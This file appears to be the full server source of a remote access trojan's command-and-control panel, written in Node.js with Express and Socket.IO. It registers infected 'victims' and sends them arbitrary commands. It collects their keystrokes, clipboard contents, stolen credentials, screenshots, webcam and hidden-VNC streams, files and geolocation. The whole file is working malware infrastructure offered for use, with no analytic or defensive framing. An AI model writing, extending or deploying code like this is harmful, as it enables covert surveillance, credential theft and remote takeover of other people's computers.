const express = require('express');
const cors = require('cors');
const http = require('http');
const { Server } = require('socket.io');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    maxHttpBufferSize: 50 * 1024 * 1024,
    cors: { origin: '*' }
});

app.use(cors());
app.use(express.json({ limit: '50mb' }));

const DATA_DIR = './data';
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR);

let victims = {};
let responses = {};
let keylogs = {};
let screenshots = {};
let credentials = {};
let processes = {};
let clipboardLog = {};

// ============ REST API ============

app.get('/api/victims', (req, res) => {
    const list = Object.values(victims).map(v => ({
        id: v.id,
        ip: v.ip,
        hostname: v.hostname,
        user: v.user,
        os: v.os,
        cpu: v.cpu,
        gpu: v.gpu,
        ram: v.ram,
        resolution: v.resolution,
        country: v.country,
        lat: v.lat,
        lon: v.lon,
        uptime: v.uptime,
        online: v.online,
        lastSeen: v.lastSeen,
        firstSeen: v.firstSeen
    }));
    res.json(list);
});

app.get('/api/victim/:id', (req, res) => {
    const v = victims[req.params.id];
    if (!v) return res.status(404).json({ error: 'Not found' });
    res.json({
        ...v,
        responses: responses[req.params.id] || [],
        keylogs: keylogs[req.params.id] || [],
        screenshots: screenshots[req.params.id] || [],
        credentials: credentials[req.params.id] || {},
        processes: processes[req.params.id] || [],
        clipboard: clipboardLog[req.params.id] || []
    });
});

app.get('/api/stats', (req, res) => {
    const all = Object.values(victims);
    const online = all.filter(v => v.online).length;
    const total = all.length;
    const today = all.filter(v => v.firstSeen && new Date(v.firstSeen).toDateString() === new Date().toDateString()).length;
    const countries = {};
    all.forEach(v => { if (v.country) countries[v.country] = (countries[v.country] || 0) + 1; });
    res.json({ total, online, offline: total - online, today, countries });
});

app.get('/api/cmd', (req, res) => {
    const { id, cmd } = req.query;
    if (!id || !cmd) return res.status(400).send('Missing params');
    io.to(id).emit('cmd', cmd);
    res.send('OK');
});

app.get('/api/responses/:id', (req, res) => {
    res.send((responses[req.params.id] || []).join('\n---\n') || 'No responses');
});

app.get('/api/keylogs/:id', (req, res) => {
    res.send((keylogs[req.params.id] || []).join('\n') || 'No keylogs');
});

app.get('/api/clipboard/:id', (req, res) => {
    res.send((clipboardLog[req.params.id] || []).join('\n---\n') || 'No clipboard');
});

app.get('/api/screenshot/:id/:file', (req, res) => {
    const p = `${DATA_DIR}/${req.params.id}/${req.params.file}`;
    if (fs.existsSync(p)) res.sendFile(require('path').resolve(p));
    else res.status(404).send('Not found');
});

// Generic action endpoint
app.get('/api/action/:action', (req, res) => {
    io.to(req.query.id).emit(req.params.action, req.query);
    res.send('OK');
});

// ============ SOCKET.IO ============

io.on('connection', (socket) => {
    const query = socket.handshake.query;
    
    if (query.role !== 'victim') return;
    
    const id = socket.id;
    const ip = socket.handshake.address;
    
    victims[id] = {
        id, ip, socketId: socket.id, online: true,
        hostname: '', user: '', os: '', cpu: '', gpu: '', ram: '',
        resolution: '', country: '', lat: 0, lon: 0, uptime: '',
        lastSeen: new Date().toISOString(), firstSeen: new Date().toISOString()
    };
    responses[id] = [];
    keylogs[id] = [];
    screenshots[id] = [];
    clipboardLog[id] = [];
    
    socket.on('register', (data) => {
        Object.assign(victims[id], data, { online: true, lastSeen: new Date().toISOString() });
    });
    
    socket.on('response', (data) => {
        responses[id].push(`[${new Date().toLocaleTimeString()}] ${data}`);
        if (responses[id].length > 500) responses[id].shift();
    });
    
    socket.on('keylog', (data) => {
        keylogs[id].push(data);
        if (keylogs[id].length > 1000) keylogs[id].shift();
    });
    
    socket.on('clipboard_data', (data) => {
        clipboardLog[id].push(`[${new Date().toLocaleTimeString()}] ${data}`);
        if (clipboardLog[id].length > 200) clipboardLog[id].shift();
    });
    
    socket.on('screenshot', (data) => {
        const dir = `${DATA_DIR}/${id}`;
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        const fn = `screen_${Date.now()}.jpg`;
        fs.writeFileSync(`${dir}/${fn}`, Buffer.from(data, 'base64'));
        screenshots[id] = screenshots[id] || [];
        screenshots[id].push({ filename: fn, time: new Date().toISOString() });
    });
    
    socket.on('screen_frame', (data) => io.emit(`stream:screen:${id}`, data));
    socket.on('webcam_frame', (data) => io.emit(`stream:webcam:${id}`, data));
    socket.on('hvnc_frame', (data) => io.emit(`stream:hvnc:${id}`, data));
    
    socket.on('webcam_snap', (data) => {
        const dir = `${DATA_DIR}/${id}`;
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        fs.writeFileSync(`${dir}/webcam_${Date.now()}.jpg`, Buffer.from(data, 'base64'));
    });
    
    socket.on('credentials', (data) => { credentials[id] = data; });
    socket.on('processes', (data) => { processes[id] = data; });
    
    socket.on('file_data', (data) => {
        const dir = `${DATA_DIR}/${id}/downloads`;
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        fs.writeFileSync(`${dir}/${data.name}`, Buffer.from(data.data, 'base64'));
        responses[id].push(`[FILE] Downloaded: ${data.name}`);
    });
    
    socket.on('video_data', (data) => {
        const dir = `${DATA_DIR}/${id}`;
        fs.writeFileSync(`${dir}/screen_rec_${Date.now()}.mp4`, Buffer.from(data, 'base64'));
        responses[id].push('[VIDEO] Screen recording saved');
    });
    
    socket.on('geolocate', (data) => {
        if (victims[id]) {
            victims[id].country = data.country;
            victims[id].lat = data.lat;
            victims[id].lon = data.lon;
        }
    });
    
    socket.on('system_info', (data) => {
        if (victims[id]) {
            victims[id].cpu = data.cpu || '';
            victims[id].gpu = data.gpu || '';
            victims[id].ram = data.ram || '';
            victims[id].resolution = data.resolution || '';
            victims[id].uptime = data.uptime || '';
        }
    });
    
    socket.on('disconnect', () => {
        if (victims[id]) {
            victims[id].online = false;
            victims[id].lastSeen = new Date().toISOString();
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
